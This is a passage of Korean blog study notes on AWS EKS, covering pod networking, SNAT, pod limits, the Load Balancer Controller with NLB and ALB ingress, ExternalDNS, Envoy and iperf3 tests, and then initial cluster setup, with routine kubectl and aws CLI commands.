지정 PODNAME1=$(kubectl get pod -l app=netshoot-pod -o jsonpath={.items[0].metadata.name}) PODNAME2=$(kubectl get pod -l app=netshoot-pod -o jsonpath={.items[1].metadata.name}) PODNAME3=$(kubectl get pod -l app=netshoot-pod -o jsonpath={.items[2].metadata.name}) # 파드 IP 변수 지정 PODIP1=$(kubectl get pod -l app=netshoot-pod -o jsonpath={.items[0].status.podIP}) PODIP2=$(kubectl get pod -l app=netshoot-pod -o jsonpath={.items[1].status.podIP}) PODIP3=$(kubectl get pod -l app=netshoot-pod -o jsonpath={.items[2].status.podIP}) # 각 파드(데이터플레인)에서 tcpdump로 ping 패킷 미리 대기 # [$N1, $N2, $N3] sudo tcpdump -i any -nn icmp 번외: eth0 나 eth1 만 패킷 모니터링해보기 이론 상으로는 eth0의 인터페이스를 쓰고 있어서 eth1에서는 안 떠야(?)하는데,\n실제 $N2에서는 eth0은 안쓰고, eth1을 쓰는 것으로 확인됨. 무슨 일인가.. To-Do sudo tcpdump -i eth0 -nn icmp sudo tcpdump -i eth1 -nn icmp 5. 데이터플레인(노드)에서 외부 통신 EXTERNAL SNAT(Source Network Address Translation) 설정에 따라,\n외부 통신 시 SNAT 사용 여부를 결정할 수 있음 아래 실습을 통해 확인 외부 ping 테스트 데이터플레인에서 정보(tcpdump, iptables) 확인 # 데이터플레인의 파드에서 외부 ping 테스트 kubectl exec -it $PODNAME1 -- ping -c 1 www.google.com # 데이터플레인: TCPDUMP 확인 ($N3) 및 iptables 규칙 확인 sudo tcpdump -i any -nn icmp sudo tcpdump -i eth0 -nn icmp ip rule ip route show table main sudo iptables -L -n -v -t nat sudo iptables -t nat -S # AWS-SNAT-CHAIN-0, AWS-SNAT-CHAIN-1에 대한 정보 확인 sudo iptables -t nat -S | grep \u0026#39;A AWS-SNAT-CHAIN\u0026#39; # conntrack 확인 # 169.254.169.x : 인스턴스 메타데이터 서비스의 IPv4 주소 # 출처: https://zetawiki.com/wiki/IP%EC%A3%BC%EC%86%8C_169.254.169.254 sudo conntrack -L -n |grep -v \u0026#39;169.254.169\u0026#39; # 데이터플레인에서 SNAT체인 모니터링 준비 watch -d \u0026#39;sudo iptables -v --numeric --table nat --list AWS-SNAT-CHAIN-0; echo ; sudo iptables -v --numeric --table nat --list AWS-SNAT-CHAIN-1; echo ; sudo iptables -v --numeric --table nat --list KUBE-POSTROUTING\u0026#39; # 데이터플레인의 파드에서 외부 ping 테스트 kubectl exec -it $PODNAME1 -- ping -i 0.1 www.google.com 여태껏 $N1에 $PODNAME1이 있는 줄 알았는데, 예상값이 이상해서 찍어보니 $N3였음; 위에서 보다시피, AWS-SNAT-CHAIN-0에 의해 데이터플레인 CIDR대역이 아니면,\nAWS-SNAT-CHAIN-1로 점프시켜서, 데이터플레인의 Private IP로 입혀서 외부로 내보낸다.\n그래서, 데이터플레인(노드)의 Public IP로 나가는 것을 볼 수 있다. 매스커레이딩\n6. 데이터플레인(노드)에 파드 생성 갯수 제한 요약: ((MaxENI * (IPv4addr-1)) + 2)\nMaxENI:\nNumber of network interfaces for the instance type IPv4addr:\nthe number of IP address per network interface t3.medium 경우 :\n(3 * (6 - 1)) + 2 = 17개 그러나, aws-node 와 kube-proxy 2개 제외하면 15개 Secondary IPv4 address로는 각 인스턴스마다 제한이 있음.\nIPv4 접두사 위임(Prefix Delegation)으로 해결 가능하지만,\n이번에는 다루지 않음(기본 내용으로도 살짝 부하) 실습에서는 t3 타입의 정보 및 데이터플레인 내에서 할당 갯수를 확인한 다음,\n실제로 파드를 생성해보면서 확인해본다.\n# t3 타입의 정보(필터) 확인 aws ec2 describe-instance-types --filters Name=instance-type,Values=t3.* \\ --query \u0026#34;InstanceTypes[].{Type: InstanceType, MaxENI: NetworkInfo.MaximumNetworkInterfaces, IPv4addr: NetworkInfo.Ipv4AddressesPerInterface}\u0026#34; \\ --output table # 데이터플레인 상세 정보 확인 : 노드 상세 정보의 Allocatable 에 pods 에 17개 정보 확인 kubectl describe node | grep Allocatable: -A7 # 데이터플레인에서 모니터링 대기 while true; do ip -br -c addr show \u0026amp;\u0026amp; echo \u0026#34;--------------\u0026#34; ; date \u0026#34;+%Y-%m-%d %H:%M:%S\u0026#34; ; sleep 1; done # 컨트롤플레인에서 모니터링 대기 watch -d \u0026#39;kubectl get pods -o wide\u0026#39; # 컨트롤플레인에서 파드 생성 명령 curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/2/nginx-dp.yaml kubectl apply -f nginx-dp.yaml # 컨트롤플레인에서 파드 증가 테스트(50개) 및 실패 확인: Too many pods kubectl scale deployment nginx-deployment --replicas=50 kubectl get pods | grep Pending kubectl describe pod ${Pending된 파드} | grep Events: -A5 # 디플로이먼트 삭제 kubectl delete deploy nginx-deployment 7. Service \u0026amp; AWS LoadBalancer Controller 서비스 방법에는 아래와 같은 종류가 있음\nClusterIP: 컨트롤플레인의 iptables룰에 의해 데이터플레인 내의 Pod IP로 접근 클러스터 내에서만 접근 가능 NodePort: 고정 포트(NodePort)로 각 데이터플레인의 IP에 접근 각 데이터플레인(노드)에 있는 iptables룰에 의해 Pod IP로 접근 LoadBalancer: 기본값 클라우드 공급자(CSP)의 로드밸런서를 활용, 데이터플레인 앞에 로드밸런서가 있음. (NLB 인스턴스 유형 기준) 이걸 거친 다음 각 데이터플레인의 iptables를 타고, 파드로 접근 Service (LoadBalancer Controller + NLB IP모드) w/AWS VPC CNI: 이번 실습에서 AWS VPC CNI를 쓰는 이유 iptables를 타지 않고, Bypass로 바로 Pod IP로 접근 이게 가능한 이유는 별도의 LB 컨트롤러 파드가 있고,\n여기에 Pod IP 정보를 지속적으로 제공 그래서 마지막의 방법을 쓰려면 OIDC를 활용해서, LB컨트롤러 IAM 정책을 적용해야함.\nOIDC: OpenID Connect(IdP) OAuth2.0와 거의 유사하다고 김세웅님께서 설명해주심. 이전 스터디에서 IAM 정책이 적용되어서 중복 에러가 뜨지만, 확인에는 문제 없음. 이렇게 권한을 주는 것을 IRSA(IAM Roles Service Account) 라고 함. 출처: IRSA@채널톡 # OIDC 확인 aws eks describe-cluster --name $CLUSTER_NAME --query \u0026#34;cluster.identity.oidc.issuer\u0026#34; --output text aws iam list-open-id-connect-providers | jq # IAM Policy (AWSLoadBalancerControllerIAMPolicy) 생성 curl -o iam_policy.json https://raw.githubusercontent.com/kubernetes-sigs/aws-load-balancer-controller/v2.4.7/docs/install/iam_policy.json # 이미 있다면, 아래의 명령어는 에러를 발생시키지만 무시해도 됨. aws iam create-policy --policy-name AWSLoadBalancerControllerIAMPolicy --policy-document file://iam_policy.json # 생성된 IAM Policy Arn 확인 aws iam list-policies --scope Local aws iam get-policy --policy-arn arn:aws:iam::$ACCOUNT_ID:policy/AWSLoadBalancerControllerIAMPolicy aws iam get-policy --policy-arn arn:aws:iam::$ACCOUNT_ID:policy/AWSLoadBalancerControllerIAMPolicy --query \u0026#39;Policy.Arn\u0026#39; # IRSA 생성 w/cloudformation eksctl create iamserviceaccount --cluster=$CLUSTER_NAME --namespace=kube-system --name=aws-load-balancer-controller \\ --attach-policy-arn=arn:aws:iam::$ACCOUNT_ID:policy/AWSLoadBalancerControllerIAMPolicy --override-existing-serviceaccounts --approve # IRSA 및 서비스 어카운트 확인 eksctl get iamserviceaccount --cluster $CLUSTER_NAME kubectl get serviceaccounts -n kube-system aws-load-balancer-controller -o yaml | yh # Helm Chart 설치 for AWS LoadBalancer Controller helm repo add eks https://aws.github.io/eks-charts helm repo update helm install aws-load-balancer-controller eks/aws-load-balancer-controller -n kube-system --set clusterName=$CLUSTER_NAME \\ --set serviceAccount.create=false --set serviceAccount.name=aws-load-balancer-controller kubectl get crd kubectl get deployment -n kube-system aws-load-balancer-controller kubectl describe deploy -n kube-system aws-load-balancer-controller | grep \u0026#39;Service Account\u0026#39; # 클러스터롤 확인 kubectl describe clusterrolebindings.rbac.authorization.k8s.io aws-load-balancer-controller-rolebinding 웹 콘솔에서 IAM 신뢰관계(Trust Relationships)를 확인 평소에는 sts:AssumeRole을 많이 봐왔는데, 이번에는 sts:AssumeRoleWithWebIdentity를 볼 수 있음. IAM신뢰관계@AWS 7-1. NLB를 활용한 서비스/파드 생성 # 모니터링 watch -d kubectl get pod,svc,ep # 디플로이먼트 \u0026amp; 서비스 생성 curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/2/echo-service-nlb.yaml cat echo-service-nlb.yaml | yh kubectl apply -f echo-service-nlb.yaml # 확인 kubectl get deploy,pod kubectl get svc,ep,ingressclassparams,targetgroupbindings kubectl get targetgroupbindings -o json | jq # AWS ELB(NLB) 정보 확인 aws elbv2 describe-load-balancers | jq aws elbv2 describe-load-balancers --query \u0026#39;LoadBalancers[*].State.Code\u0026#39; --output text # 웹 접속 주소 확인 kubectl get svc svc-nlb-ip-type -o jsonpath={.status.loadBalancer.ingress[0].hostname} | awk \u0026#39;{ print \u0026#34;Pod Web URL = http://\u0026#34;$1 }\u0026#39; # 파드 로깅 모니터링 kubectl logs -l app=deploy-websrv -f # 분산 접속 확인 NLB=$(kubectl get svc svc-nlb-ip-type -o jsonpath={.status.loadBalancer.ingress[0].hostname}) curl -s $NLB for i in {1..100}; do curl -s $NLB | grep Hostname ; done | sort | uniq -c | sort -nr 7-2. Scaling down/up 파드 2개 -\u0026gt; 1개 -\u0026gt; 3개로 스케일링 특히, draining 중인 파드는 무시하고 스케일링을 진행함. 당연한 말이겠지만, LB Controller 파드가 따로 있기 때문에 가능한 일 # 컨트롤플레인에서 레플리카 수 변경 (2 -\u0026gt; 1 -\u0026gt; 3) # 웹 콘솔에서 NLB 상태 확인 kubectl scale deployment deploy-echo --replicas=1 kubectl scale deployment deploy-echo --replicas=3 # AWS LB Controller kubectl describe deploy -n kube-system aws-load-balancer-controller | grep \u0026#39;Service count\u0026#39; # [AWS LB Ctrl] 클러스터 롤 바인딩 정보 확인 kubectl describe clusterrolebindings.rbac.authorization.k8s.io aws-load-balancer-controller-rolebinding # [AWS LB Ctrl] 클러스터롤 확인 kubectl describe clusterroles.rbac.authorization.k8s.io aws-load-balancer-controller-role # 실습 리소스 삭제 kubectl delete deploy deploy-echo; kubectl delete svc svc-nlb-ip-type 7-3. NLB 대상 타겟을 Instance mode로 설정해보기 NLB IP Target \u0026amp; Proxy Protocol v2 활성화 : NLB에서 바로 파드로 인입 및 ClientIP 확인 설정 # 생성 cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: apps/v1 kind: Deployment metadata: name: gasida-web spec: replicas: 1 selector: matchLabels: app: gasida-web template: metadata: labels: app: gasida-web spec: terminationGracePeriodSeconds: 0 containers: - name: gasida-web image: gasida/httpd:pp ports: - containerPort: 80 --- apiVersion: v1 kind: Service metadata: name: svc-nlb-ip-type-pp annotations: service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing service.beta.kubernetes.io/aws-load-balancer-cross-zone-load-balancing-enabled: \u0026#34;true\u0026#34; service.beta.kubernetes.io/aws-load-balancer-proxy-protocol: \u0026#34;*\u0026#34; spec: ports: - port: 80 targetPort: 80 protocol: TCP type: LoadBalancer loadBalancerClass: service.k8s.aws/nlb selector: app: gasida-web EOF # 확인 kubectl get svc,ep kubectl describe svc svc-nlb-ip-type-pp kubectl describe svc svc-nlb-ip-type-pp | grep Annotations: -A5 # apache에 proxy protocol 활성화 확인 kubectl exec deploy/gasida-web -- apachectl -t -D DUMP_MODULES kubectl exec deploy/gasida-web -- cat /usr/local/apache2/conf/httpd.conf # 접속 확인 NLB=$(kubectl get svc svc-nlb-ip-type-pp -o jsonpath={.status.loadBalancer.ingress[0].hostname}) curl -s $NLB # 지속적인 접속 시도 : 아래 상세 동작 확인 시 유용(패킷 덤프 등) while true; do curl -s --connect-timeout 1 $NLB; echo \u0026#34;----------\u0026#34; ; date \u0026#34;+%Y-%m-%d %H:%M:%S\u0026#34; ; sleep 1; done # 로그 확인 kubectl logs -l app=gasida-web -f # 삭제 kubectl delete deploy gasida-web; kubectl delete svc svc-nlb-ip-type-pp 8. Ingress 클러스터 내부의 서비스(ClusterIP, NodePort, Loadbalancer)를 외부로 노출(HTTP/HTTPS)\nWeb Proxy 역할: 어라 그러면, ClusterIP를 써도\u0026hellip;.(?)\nAWS VPC CNI 에서 AWS LB 컨트롤러 + Ingress (ALB) IP 모드 동작\n바로 파드의 IP로 통신이 가능 # 게임 파드와 Service, Ingress 배포 curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/3/ingress1.yaml kubectl apply -f ingress1.yaml # 모니터링 watch -d kubectl get pod,ingress,svc,ep -n game-2048 # 생성 확인 kubectl get-all -n game-2048 kubectl get ingress,svc,ep,pod -n game-2048 kubectl get targetgroupbindings -n game-2048 # Ingress 확인 kubectl describe ingress -n game-2048 ingress-2048 # 게임 접속 : ALB 주소로 웹 접속 kubectl get ingress -n game-2048 ingress-2048 -o jsonpath={.status.loadBalancer.ingress[0].hostname} | awk \u0026#39;{ print \u0026#34;Game URL = http://\u0026#34;$1 }\u0026#39; # 파드 IP 확인 kubectl get pod -n game-2048 -owide # 파드 스케일 모니터링 watch kubectl get pod -n game-2048 # 파드 3개로 증가 kubectl scale deployment -n game-2048 deployment-2048 --replicas 3 # 파드 1개로 감소 kubectl scale deployment -n game-2048 deployment-2048 --replicas 1 # 삭제 kubectl delete ingress ingress-2048 -n game-2048 kubectl delete svc service-2048 -n game-2048 \u0026amp;\u0026amp; kubectl delete deploy deployment-2048 -n game-2048 \u0026amp;\u0026amp; kubectl delete ns game-2048 9. External DNS 외부 DNS 서비스를 통해 도메인을 통해 접속 가능하도록 설정 AWS Route53에 Public 도메인을 등록시켜놓았음 ExternalDNS CTRL 권한 주는 방법 3가지: Node IAM Role: EKS 원클릭 배포 시 설정되어 있음 eksctl create cluster \u0026hellip; \u0026ndash;external-dns-access \u0026hellip; Static credentials IRSA 9-1. Route53 정보 확인 및 변수 지정 중간에 명령어가 잘못되었는지, 제대로 값이 뜨지 않는 것이 있었음 # 도메인 변수 지정 # MyDomain=\u0026lt;소유한 도메인\u0026gt; MyDomain=awskops.click # Route 53 도메인 ID 조회 및 변수 지정 aws route53 list-hosted-zones-by-name --dns-name \u0026#34;${MyDomain}.\u0026#34; | jq MyDnzHostedZoneId=`aws route53 list-hosted-zones-by-name --dns-name \u0026#34;${MyDomain}.\u0026#34; --query \u0026#34;HostedZones[0].Id\u0026#34; --output text` echo $MyDnzHostedZoneId # A 레코드 타입 조회: 정상적으로 조회되지 않음 aws route53 list-resource-record-sets --hosted-zone-id \u0026#34;${MyDnzHostedZoneId}\u0026#34; --query \u0026#34;ResourceRecordSets[?Type == \u0026#39;A\u0026#39;].Name\u0026#34; --output text 9-2. ExternalDNS 설치 # Route53 변수 확인 echo $MyDomain, $MyDnzHostedZoneId # ExternalDNS 배포 curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/aews/externaldns.yaml MyDomain=$MyDomain MyDnzHostedZoneId=$MyDnzHostedZoneId envsubst \u0026lt; externaldns.yaml | kubectl apply -f - # 확인 및 로그 모니터링 kubectl get pod -l app.kubernetes.io/name=external-dns -n kube-system kubectl logs deploy/external-dns -n kube-system -f 9-3. Service(NLB) + 도메인 연동(ExternalDNS) 리소스 삭제 시, ExternalDNS에 의해 A레코드도 함께 제거됨을 확인 # 모니터링 준비 및 로그 조회 watch -d \u0026#39;kubectl get pod,svc\u0026#39; kubectl logs deploy/external-dns -n kube-system -f # 테트리스 디플로이먼트 배포 cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: apps/v1 kind: Deployment metadata: name: tetris labels: app: tetris spec: replicas: 1 selector: matchLabels: app: tetris template: metadata: labels: app: tetris spec: containers: - name: tetris image: bsord/tetris --- apiVersion: v1 kind: Service metadata: name: tetris annotations: service.beta.kubernetes.io/aws-load-balancer-nlb-target-type: ip service.beta.kubernetes.io/aws-load-balancer-scheme: internet-facing service.beta.kubernetes.io/aws-load-balancer-cross-zone-load-balancing-enabled: \u0026#34;true\u0026#34; service.beta.kubernetes.io/aws-load-balancer-backend-protocol: \u0026#34;http\u0026#34; #service.beta.kubernetes.io/aws-load-balancer-healthcheck-port: \u0026#34;80\u0026#34; spec: selector: app: tetris ports: - port: 80 protocol: TCP targetPort: 80 type: LoadBalancer loadBalancerClass: service.k8s.aws/nlb EOF # 배포 확인 : CLB 배포 확인 kubectl get deploy,svc,ep tetris # NLB에 ExternanDNS 로 도메인 연결 kubectl annotate service tetris \u0026#34;external-dns.alpha.kubernetes.io/hostname=tetris.$MyDomain\u0026#34; # Route53에 A레코드 확인 # jq 까지 하는 경우 정상적으로 조회되지 않음;; aws route53 list-resource-record-sets --hosted-zone-id \u0026#34;${MyDnzHostedZoneId}\u0026#34; --query \u0026#34;ResourceRecordSets[?Type == \u0026#39;A\u0026#39;]\u0026#34; | jq aws route53 list-resource-record-sets --hosted-zone-id \u0026#34;${MyDnzHostedZoneId}\u0026#34; --query \u0026#34;ResourceRecordSets[?Type == \u0026#39;A\u0026#39;].Name\u0026#34; | jq .[] # Public IP(도메인 DNS) 확인 dig +short tetris.$MyDomain @8.8.8.8 dig +short tetris.$MyDomain # 도메인 체크 echo -e \u0026#34;My Domain Checker = https://www.whatsmydns.net/#A/tetris.$MyDomain\u0026#34; # 웹 접속 주소 확인 및 접속 echo -e \u0026#34;Tetris Game URL = http://tetris.$MyDomain\u0026#34; # 리소스 삭제 kubectl delete deploy,svc tetris 10. Envoy (반쪽 실습) istio를 위해 설치는 했으나, istio가 제대로 안되서 Envoy만 기재 Envoy: L7 Proxy, istio의 Sidecar proxy istiod: 컨트롤플레인 Envoy: 데이터플레인 (istio-proxy \u0026gt; envoy) istio-proxy 안에 Envoy가 들어있다는 것 # 컨트롤플레인에 Envoy 설치 sudo rpm --import \u0026#39;https://rpm.dl.getenvoy.io/public/gpg.CF716AF503183491.key\u0026#39; curl -sL \u0026#39;https://rpm.dl.getenvoy.io/public/config.rpm.txt?distro=el\u0026amp;codename=7\u0026#39; \u0026gt; /tmp/tetrate-getenvoy-rpm-stable.repo sudo yum-config-manager --add-repo \u0026#39;/tmp/tetrate-getenvoy-rpm-stable.repo\u0026#39; sudo yum makecache --disablerepo=\u0026#39;*\u0026#39; --enablerepo=\u0026#39;tetrate-getenvoy-rpm-stable\u0026#39; -y sudo yum install getenvoy-envoy -y envoy --version 10-1. Envoy proxy 실습 w.Envoy-demo Envoy 상에서 웹서버 구동을 위한 myhome.yaml 생성 방법을 이해하지 못함 직전까지 하여, 데모 페이지 및 어드민 페이지 확인 # 데모 config 적용하여 실행 # `connect_timeout` missing 에러 출력되면서 실행 실패 curl -O https://www.envoyproxy.io/docs/envoy/latest/_downloads/92dcb9714fb6bc288d042029b34c0de4/envoy-demo.yaml envoy -c envoy-demo.yaml # connect_timeout 추가 후 다시 실행 sed -i\u0026#39;\u0026#39; -r -e \u0026#34;/dns_lookup_family/a\\ connect_timeout: 5s\u0026#34; envoy-demo.yaml envoy -c envoy-demo.yaml # 정보 확인 # ... 0.0.0.0:10000 0.0.0.0:* users:((\u0026#34;envoy\u0026#34; ... ss -tnlp # 접속 테스트 curl -s http://127.0.0.1:10000 | grep -o \u0026#34;\u0026lt;title\u0026gt;.*\u0026lt;/title\u0026gt;\u0026#34; \u0026lt;title\u0026gt;Envoy Proxy - Home\u0026lt;/title\u0026gt; # envoy 데모 페이지 확인 echo -e \u0026#34;Envoy Proxy Demo = http://$(curl -s ipinfo.io/ip):10000\u0026#34; # 연결 정보 확인 ss -tnp # 기존 envoy 실행 취소 후 (관리자페이지) 설정 덮어쓰기 cat \u0026lt;\u0026lt;EOT\u0026gt; envoy-override.yaml admin: address: socket_address: address: 0.0.0.0 port_value: 9902 EOT envoy -c envoy-demo.yaml --config-yaml \u0026#34;$(cat envoy-override.yaml)\u0026#34; # 웹브라우저에서 http://192.168.10.254:9902 접속 확인 # 어드민 페이지 접속 확인 echo -e \u0026#34;Envoy Proxy Demo = http://$(curl -s ipinfo.io/ip):9902\u0026#34; 11. 파드간 속도 측정 iperf3: 서버 모드로 동작하는 단말과 클라이언트 모드로 동작하는 단말로 구성해서 최대 네트워크 대역폭 측정 TCP, UDP, SCTP 지원 11-1. iperf3 배포 서버 모드와 클라이언트 모드가 각각 다른 데이터플레인에 배포되어야 함 실제 실습의 경우에는 $N1에 서버 모드, $N3에 클라이언트 모드 배포 확인 # 배포 curl -s -O https://raw.githubusercontent.com/gasida/PKOS/main/aews/k8s-iperf3.yaml kubectl apply -f k8s-iperf3.yaml # 확인 : 서버와 클라이언트가 다른 데이터플레인에 배포되었는지 확인 kubectl get deploy,svc,pod -owide # 서버 파드 로그 확인 : 기본 5201 포트 Listen kubectl logs -l app=iperf3-server -f 11-2. iperf3 테스트 TCP 5201, 측정시간 5초 UDP 사용, 역방향 모드(-R) TCP, 쌍방향 모드(-R) 해당사항 실습 누락함 TCP 다중 스트림(30개), -P(number of parallel client streams to run) # 공통 모니터링 # 서버 파드 로그 확인 : 기본 5201 포트 Listen kubectl logs -l app=iperf3-server -f # 1. TCP 5201, 측정시간 5초 kubectl exec -it deploy/iperf3-client -- iperf3 -c iperf3-server -t 5 # 2. UDP 사용, 역방향 모드(-R) kubectl exec -it deploy/iperf3-client -- iperf3 -c iperf3-server -u -b 20G # 3. TCP, 쌍방향 모드(-R) kubectl exec -it deploy/iperf3-client -- iperf3 -c iperf3-server -t 5 --bidir # 4. TCP 다중 스트림(30개), -P(number of parallel client streams to run) kubectl exec -it deploy/iperf3-client -- iperf3 -c iperf3-server -t 10 -P 2 # 실습 리소스 삭제 kubectl delete -f k8s-iperf3.yaml reference CloudNet@ Notion 및 Slack 채널 kube-proxy ipvs issue @AWS Github EKS addons advanced configuration @AWS blog ipvs vs iptables veth @44bits 169.254.169.254 @zetawiki masquerading @joongang IRSA @channel.io Trust Policies with IAM roles @AWS blog ","date":"2023-05-07T07:30:52+09:00","permalink":"https://blog.minseong.xyz/post/aws-eks-study-week2/","section":"post","tags":["AWS","EKS","CloudNet@","network"],"title":"AWS EKS 스터디 2주차 - Network"},{"categories":null,"contents":"최근 CloudNet@에서 진행하고 있는\nAWS EKS Workshop Study(이하, AEWS)에 참여하게 되었습니다.\nk8s가 워낙 인기가 많기도 하지만, 지난 kOps 스터디를 통해 관리요소가 참 많은 것을 느꼈었고,\n좀더 수월하게 이해를 해보고자 AWS 서비스인\nEKS(Elastic Kubernetes Service)를 이번 기회에 살펴보기로 했습니다.\nEKS 사용에 있어 고려사항 EKS는 관리형 서비스(managed service)이기에 아래와 같은 장점이 있습니다.\n클러스터링을 위한 Control Plane(일명, 마스터 노드)을 AWS에서 관리해줍니다. 워커노드는 사용자가 AMI를 구성하여 이를 사용 AWS에서 제공하는 Fargate로 VM을 할당하여 사용 kOps와도 유사하지만, 다른 AWS 서비스와의 연동이 용이합니다.\n개인적으로는 ACM의 인증서 사용에 있어 더 편할 것이라 생각을 했습니다. ECR에 저장한 컨테이너 이미지를 활용가능 IAM을 통한 권한 관리 ELB를 통한 로드밸런싱 VPC를 통한 네트워크 관리 오픈소스 k8s 기반이기에 EKS로의 용이한 마이그레이션 API 서버 Cluster Endpoint 구성 EKS는 Control Plane을 관리해주나, 마스터 노드에 접근이 필요한 경우가 있습니다.\n이를 위해, Cluster Endpoint를 구성하여 마스터 노드에 접근할 수 있습니다.\nEKS Cluster Endpoint Access Control\n아래와 같이 구분할 수 있습니다.\nEndpoint Public 액세스 Endpoint Private 액세스 Description Enabled Disabled 최초 기본 값, 퍼블릭 IP로 접속 Enabled Enabled k8s API 요청은 AWS VPC 엔드포인트 사용 Disabled Enabled 모든 트래픽이 AWS VPC 엔드포인트 사용 3번째 구성이 권장. kubectl 명령에 의한 모든 트래픽이 EKS에서 관리되는 ENI을 타게 됨. EKS 배포해보기 스터디에서는 kOps 때와 같이 cloudformation 기반으로 배포.\n소스코드 예제를 참조하여, spot instance를 사용하도록 템플릿 재구성을 하고 싶었으나,\n아직 적용할 시점은 아니라고 생각되어 skip\ncloudformation 적용\naws cloudformation deploy --template-file ~/Documents/aews/myeks-1week.yaml \\ --stack-name myeks --parameter-overrides KeyName=aews SgIngressSshCidr=$(curl -s ipinfo.io/ip)/32 --region ap-northeast-2 웹 콘솔에서도 확인 가능 # EC2 IP 출력 echo $(aws cloudformation describe-stacks --stack-name myeks --query \u0026#39;Stacks[*].Outputs[*].OutputValue\u0026#39; --output text) # EC2 SSH 접속 ssh -i ~/.ssh/aews.pem ec2-user@$(aws cloudformation describe-stacks --stack-name myeks --query \u0026#39;Stacks[*].Outputs[*].OutputValue\u0026#39; --output text) 아래와 같이 정상적으로 접속된다. EKS 호스트 확인 cloudformation 템플릿에 적어둔 각 버전을 정상적으로 확인 kubectl version --client=true -o yaml | yh eksctl version aws --version ls /root/.ssh/id_rsa* docker info 아래와 같이 kubectl은 eks용 v1.25.7이 적용되었음을 알 수 있음 EKS 클러스터 생성 아래와 같이 입력하여 클러스터 생성하였음 다만, ssh 접속 상태에서 aws configure로 access key, secret key를 입력해야하는데\n다행인지 불행인지 로컬에서 해당 키값을 암호화하지 않았기 때문에 입력에 큰 어려움이 없었다. # 환경 값 설정 export VPCID=$(aws ec2 describe-vpcs --filters \u0026#34;Name=tag:Name,Values=$CLUSTER_NAME-VPC\u0026#34; | jq -r .Vpcs[].VpcId) export PubSubnet1=$(aws ec2 describe-subnets --filters Name=tag:Name,Values=\u0026#34;$CLUSTER_NAME-PublicSubnet1\u0026#34; --query \u0026#34;Subnets[0].[SubnetId]\u0026#34; --output text) export PubSubnet2=$(aws ec2 describe-subnets --filters Name=tag:Name,Values=\u0026#34;$CLUSTER_NAME-PublicSubnet2\u0026#34; --query \u0026#34;Subnets[0].[SubnetId]\u0026#34; --output text) # eksctl 통해 생성을 하면, cloudformation에서 생성현황을 확인할 수 있음 eksctl create cluster --name $CLUSTER_NAME --region=$AWS_DEFAULT_REGION --nodegroup-name=$CLUSTER_NAME-nodegroup --node-type=t3.medium \\ --node-volume-size=30 --vpc-public-subnets \u0026#34;$PubSubnet1,$PubSubnet2\u0026#34; --version 1.24 --ssh-access --external-dns-access --verbose 4 생성 전 아래와 같이 정상적으로 생성되었음을 확인 한국 리전의 A, C AZ를 대상으로, 1.24 버전의 k8s 클러스터가 생성되었음을 확인 클러스터 엔드포인트 및 eks API 접속 시도 아래와 같이 클러스터 엔드포인트를 확인하고, 접속 시도 API server endpoint access가 현재 Public으로 활성화되어 있기 때문에 접속은 가능. AWS에서 관리하는 API 서버의 IP도 조회(=노출)된다. # 클러스터 엔드포인트 확인 aws eks describe-cluster --name $CLUSTER_NAME | jq -r .cluster.endpoint # API서버 IP 확인 APIDNS=$(aws eks describe-cluster --name $CLUSTER_NAME | jq -r .cluster.endpoint | cut -d \u0026#39;/\u0026#39; -f 3) dig +short $APIDNS kubectl로 생성된 클러스터 및 파드 확인 클러스터는 현재 온디맨드 t3.medium을 사용하고 있기 때문에, 빠르게 학습 확인하고 삭제하야여함 파드의 경우, 컨트롤 플레인이 AWS에서 관리하기 때문에, 해당 파드는 명령어로 확인할 수 없음. [온프레미스와 다른 점] 확인되는 ECR 이미지(~eksbuild~)를 pull하려고 하면 권한이 없다고 나옴. kubectl get node --label-columns=node.kubernetes.io/instance-type,eks.amazonaws.com/capacityType,topology.kubernetes.io/zone kubectl get node -v=6 kubectl get node --label-columns=eks.amazonaws.com/capacityType kubectl get pod -n kube-system -o wide 노드 ping 테스트 및 ssh 접속 노드는 Public Subnet에 생성되었기 때문에, ping 테스트가 당연히 될 줄 알았는데, 안됨 ssh는 정상적으로 접속 이유는 해당 sg에서 ssh에 대해서만 허용이 걸려있어서, ping(ICMP)은 허용이 안되어있음 myeks-host에서 워커노드(파드)에 ping을 날릴 수 있도록 정책을 풀어줘야함 참조 ICMP @cloudflare ICMP @NetApp sg 프로토콜 \u0026lsquo;-1\u0026rsquo;의 의미 # EC2 인스턴스의 현재 IP확인 및 각 노드에 대한 IP값 저장 aws ec2 describe-instances --query \u0026#34;Reservations[*].Instances[*].{PublicIPAdd:PublicIpAddress,PrivateIPAdd:PrivateIpAddress,InstanceName:Tags[?Key==\u0026#39;Name\u0026#39;]|[0].Value,Status:State.Name}\u0026#34; --filters Name=instance-state-name,Values=running --output table N1=$(kubectl get node --label-columns=topology.kubernetes.io/zone --selector=topology.kubernetes.io/zone=ap-northeast-2a -o jsonpath={.items[0].status.addresses[0].address}) N2=$(kubectl get node --label-columns=topology.kubernetes.io/zone --selector=topology.kubernetes.io/zone=ap-northeast-2c -o jsonpath={.items[0].status.addresses[0].address}) echo $N1, $N2 # ping 테스트 ping -c 2 $N1 ping -c 2 $N2 # 해당 sg 확인 NGSGID=$(aws ec2 describe-security-groups --filters Name=group-name,Values=*nodegroup* --query \u0026#34;SecurityGroups[*].[GroupId]\u0026#34; --output text) echo $NGSGID # ssh는 정상 작동 확인 ssh -i ~/.ssh/id_rsa ec2-user@$N1 hostname # 인바운드룰을 완화시켜서 ping이 가능하도록 변경 (오직 myeks-host에서만) aws ec2 authorize-security-group-ingress --group-id $NGSGID --protocol \u0026#39;-1\u0026#39; --cidr 192.168.1.100/32 # { # \u0026#34;Return\u0026#34;: true, # \u0026#34;SecurityGroupRules\u0026#34;: [ # { # \u0026#34;SecurityGroupRuleId\u0026#34;: \u0026#34;sgr-0304dbf69b2b131b8\u0026#34;, # \u0026#34;GroupId\u0026#34;: \u0026#34;sg-0e863cf3d7a36790e\u0026#34;, # \u0026#34;GroupOwnerId\u0026#34;: \u0026#34;179746107155\u0026#34;, # \u0026#34;IsEgress\u0026#34;: false, # \u0026#34;IpProtocol\u0026#34;: \u0026#34;-1\u0026#34;, # \u0026#34;FromPort\u0026#34;: -1, # 